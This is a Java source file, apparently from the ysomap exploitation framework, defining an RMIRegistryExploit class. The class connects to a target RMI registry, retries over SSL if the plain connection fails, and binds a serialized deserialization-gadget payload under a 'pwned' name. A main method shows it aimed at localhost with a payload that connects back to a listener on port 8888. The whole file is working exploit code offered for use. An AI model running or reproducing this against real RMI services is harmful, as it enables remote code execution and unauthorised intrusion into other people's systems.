package ysomap.core.exploit.rmi;

import ysomap.annotation.Authors;
import ysomap.annotation.Dependencies;
import ysomap.annotation.Exploits;
import ysomap.annotation.Require;
import ysomap.core.bean.Bullet;
import ysomap.core.bean.Exploit;
import ysomap.core.bean.Payload;
import ysomap.core.exploit.rmi.component.RMISSLClientSocketFactory;
import ysomap.core.gadget.payload.rmi.RMIConnectWithUnicastRemoteObject;
import ysomap.util.Logger;
import ysomap.util.PayloadHelper;

import java.rmi.ConnectIOException;
import java.rmi.Remote;
import java.rmi.registry.LocateRegistry;
import java.rmi.registry.Registry;

/**
 * @author wh1t3P1g
 * @since 2020/2/25
 */
@Exploits
@Authors({Authors.WH1T3P1G})
@Require(bullets = {"all gadgets","RMIConnectWrapped","RMIConnectWrappedWithProxy","RMIConnectWithUnicastRemoteObject"})
@Dependencies({"need set a gadget"})
public class RMIRegistryExploit extends Exploit {

    @Require(name = "target", detail = "target RMI Registry host:port, like localhost:1099")
    public String target;

    public Object payload;

    public String payloadName;

    @Override
    public void run() {
        try {
            String[] detail = target.split(":");
            if(detail.length == 2){
                Registry registry = LocateRegistry.getRegistry(detail[0], Integer.parseInt(detail[1]));

                // test RMI registry connection and upgrade to SSL connection on fail
                try {
                    registry.list();
                } catch(ConnectIOException ex) {
                    registry = LocateRegistry.getRegistry(detail[0], Integer.parseInt(detail[1]), new RMISSLClientSocketFactory());
                }

                String name = "pwned" + System.nanoTime();
                Remote remote = null;
                if(payload instanceof Remote){
                    remote = (Remote) payload;
                } else{
                    remote = PayloadHelper.createMemoitizedProxy(PayloadHelper.createMap(name, payload), Remote.class);
                }
                try{
                    registry.rebind(name, remote);
                }catch (Throwable e){
                    Logger.error(e.toString());
                }
            }

        } catch (Exception e) {
            Logger.error(e.toString());
        }
        exit = true;
        Logger.success(this+" done!");
    }

    @Override
    public String toString() {
        return "RMIRegistryExploit{" +
                "target='" + target + '\'' +
                ", payload=" + payloadName +
                '}';
    }

    public static void main(String[] args) throws Exception {
        Payload payload = new RMIConnectWithUnicastRemoteObject();
        Bullet bullet = (Bullet) payload.getDefaultBullet("");
        bullet.set("rhost","127.0.0.1");
        bullet.set("rport","8888");
        payload.setBullet(bullet);
        Exploit exploit = new RMIRegistryExploit();
        exploit.set("target","127.0.0.1:1099");
        exploit.set("payload", payload.getObject());
        exploit.run();
    }
}
